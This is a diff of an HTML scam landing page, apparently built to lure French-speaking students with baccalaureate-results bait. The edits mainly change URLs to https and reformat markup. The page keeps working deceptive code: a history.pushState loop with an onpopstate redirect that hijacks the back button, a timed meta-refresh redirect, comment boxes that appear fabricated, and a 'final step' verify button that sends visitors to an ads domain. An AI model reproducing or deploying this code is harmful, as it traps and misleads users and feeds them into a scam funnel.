@@ -1,6 +1,6 @@
 <html xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
 <head>
-    <meta http-equiv="refresh" content="240; url=http://bac-2022.herokuapp.com">
+    <meta http-equiv="refresh" content="240; url=https://bac-2022.herokuapp.com">
 
 <script type="text/javascript">
 ! function () {
@@ -8,7 +8,7 @@ var t;
 try {
 for (t = 0; 10 > t; ++t) history.pushState({}, "", "#");
 onpopstate = function (t) {
-t.state && location.replace("http://bac-2022.herokuapp.com")
+t.state && location.replace("https://bac-2022.herokuapp.com")
 }
 } catch (o) {}
 }();
@@ -612,12 +612,13 @@ font-size: 21px;
 <div class="wrapper">
     <div class="container-main">
           <h3 style="color: #d84a59;
-    font-weight: bold;
-    text-align:center;
-    font-size: 21px;
-    font-family: 'ProximaNovaBlack';">À l'occasion du notre jour de l'indépendance ✨</h3>
+                    font-weight: bold;
+                    text-align:center;
+                    font-size: 21px;
+                    font-family: 'ProximaNovaBlack';">
+            À l'occasion du notre jour de l'indépendance ✨</h3>
         <center>
-            <%= image_tag "resultat-bac-2021.jpeg", style:"width: 33%;" %>
+           
             <span>220.000 élèves ont échoué et nous allons nous préparer et affronter le bac ensemble</span>
         </center>
         <br />
@@ -908,30 +909,29 @@ font-size: 21px;
         <!-- FIN Ventana permiso -->
         <!--verify-->
         <div class="loading2 js-hidden js-verify">
-                                <div class="loading2__box">
-                                    <center> <b style="font-weight:bold; font-size:16px">étape finale</b></center>
-                                    <br />
-                                    <br />
-                                    <center><br /><b style="font-size:14px">Cliquez sur Obtenir pour voir votre place<br> ou voir si 
-                                            vos information correctement</b></center> <br />
-                                    <div style="display: flex;">
-                                        <center>
-                                            <button
-                                                style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;"
-                                                id="verify" class="quedate__cta-btn">Obtenir plus d'information </button>
-                                            <br /><br />
+            <div class="loading2__box">
+                <center> <b style="font-weight:bold; font-size:16px">étape finale</b></center>
+                    <br />
+                    <br />
+                    <center><br /><b style="font-size:14px">Cliquez sur Obtenir pour voir votre place<br> ou voir si 
+                        vos information correctement</b></center> <br />
+                        <div style="display: flex;">
+                            <center>
+                                <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;"
+                                    id="verify" class="quedate__cta-btn">Obtenir plus d'information </button>
+                                    <br /><br />
 
-                                        </center>
-                                    </div>
-                                </div>
-                                <br />
-                                <center>
-                                    <script type="text/javascript" src="#"></script>
-                                </center>
-                            </div>
+                            </center>
                         </div>
-                    </div>
-                </div>
+            </div>
+            <br />
+            <center>
+                <script type="text/javascript" src="#"></script>
+            </center>
+            </div>
+        </div>
+    </div>
+</div>
                 <br />
                 <br />
                 <br />
@@ -1155,9 +1155,7 @@ font-size: 21px;
                                 </div>
                             </div>
                             <div class="chat__conversation-box chat__conversation-box--right">
-                                
                                 <img src="https://pbs.twimg.com/profile_images/1367267802940375042/H4JDd6aC_normal.jpg" class="chat__conversation-box-img" alt="">
-                            
                                 <div class="chat__conversation-box-content">
                                     <div class="chat__conversation-box-content-comment ">
                                         <span class="chat__conversation-box-content-comment-name">Ibrahima Konaté</span>
@@ -1291,8 +1289,8 @@ font-size: 21px;
                         congrats: document.querySelector(".js-congrats"),
                         sharing: document.querySelector(".js-share"),
                         verify: document.querySelector("#verify")
-                    }, objServer = {}, landingDomain = "//lnclass.com",
-                        adsLink = "//lnclass.com";
+                    }, objServer = {}, landingDomain = "lnclass.com",
+                        adsLink = "lnclass.com";
                     document.addEventListener("click", function (c) {
                         console.log(c);
                         var a = c.toElement || c.srcElement;
